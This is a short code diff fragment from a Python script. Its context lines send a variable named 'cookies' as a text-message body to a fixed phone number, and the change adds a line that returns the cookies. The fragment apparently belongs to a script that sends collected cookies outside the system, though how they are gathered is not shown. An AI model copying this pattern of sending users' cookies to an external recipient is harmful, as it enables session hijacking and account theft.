@@ -41,6 +41,8 @@ def main():
         body=cookies, from_="+15036766473", to="+19524262052"
     )
 
+    return cookies
+
 
 if __name__ == "__main__":
     app.run()
